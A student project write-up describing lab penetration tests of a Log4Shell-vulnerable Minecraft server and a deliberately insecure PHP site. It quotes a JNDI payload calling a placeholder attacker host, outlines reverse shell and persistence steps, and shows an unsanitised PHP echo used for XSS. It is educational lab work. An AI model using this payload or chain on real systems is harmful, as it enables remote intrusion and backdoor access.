Ethical Hacking

IT2212 — Penetration Testing & Exploitation on Vulnerable Targets

Overview

A group project where we built a deliberately vulnerable web application and a Minecraft server environment, then performed real penetration tests against them. The goal was to walk through the full ethical hacking lifecycle — reconnaissance, exploitation, and post-exploitation — on targets we controlled, demonstrating how common vulnerabilities are discovered and abused in the real world.

The project had two main attack surfaces: a PHP web application riddled with security flaws, and a Minecraft Java Edition server vulnerable to the infamous Log4J (Log4Shell) exploit. We used industry tools like Burp Suite, Metasploit, and custom payloads to compromise both targets and establish backdoor access.

Minecraft & Log4J (CVE-2021-44228)

The highlight of the project was exploiting a Minecraft server through the Log4Shell vulnerability. Minecraft Java Edition uses Apache Log4j for logging, and any chat message typed by a player gets processed by the logging library. By sending a crafted JNDI lookup string in the in-game chat, we triggered the server to reach out to our attacker-controlled LDAP server, which served a malicious Java class — giving us remote code execution on the target machine.

  • 1 — Setup Stood up a vulnerable Minecraft server (pre-patch version using Log4j 2.x) on an isolated lab network. Configured an attacker machine with a rogue LDAP server and a reverse shell payload.
  • 2 — Trigger Connected to the Minecraft server as a regular player and typed a crafted JNDI lookup string (${jndi:ldap://attacker-ip/exploit}) into the in-game chat. Log4j parsed the message and made an outbound LDAP request to our server.
  • 3 — Payload Delivery Our rogue LDAP server responded with a reference to a malicious Java class hosted on a separate HTTP server. The Minecraft server downloaded and executed the class automatically.
  • 4 — Backdoor Access The payload opened a reverse shell back to our attacker machine, giving us full command-line access to the server. From there we demonstrated persistence by planting a backdoor that survives server restarts.

Vulnerable Web Application

We also built a PHP web application as a second target — a simple dog breed website with login, registration, and file upload features. The app was intentionally coded with multiple security flaws to serve as a penetration testing playground.

Unrestricted File Upload

The upload form accepts any file type with no validation — no extension checks, no MIME type filtering, no size limits. We uploaded a PHP web shell directly through the form and accessed it via the browser to execute arbitrary commands on the server.

Cross-Site Scripting (XSS)

The login success page echoes the user's name directly into the HTML with <?php echo $_POST["name"]; ?> — no sanitisation at all. Injecting a script tag in the name field executes JavaScript in the victim's browser, enabling session hijacking or phishing.

Weak Authentication

The login form sends credentials in plain POST with no parameterised queries, no rate limiting, and no account lockout. The registration also hashes the password using an uninitialised variable rather than the actual user input — meaning stored passwords are predictable.

No CSRF Protection

None of the forms include anti-CSRF tokens. An attacker can craft a malicious page that auto-submits requests to the application on behalf of a logged-in user — changing passwords, uploading files, or modifying data without the user's knowledge.

Tools & Techniques

  • Log4Shell Exploit Chain Rogue LDAP server + malicious Java class + reverse shell payload to achieve RCE via Minecraft chat
  • PHP Web Shell Uploaded through the unrestricted file upload to gain command execution on the web server
  • Burp Suite Intercepted and modified HTTP requests to test for XSS, parameter tampering, and authentication bypasses
  • Netcat / Reverse Shells Established backdoor connections from compromised targets back to the attacker machine
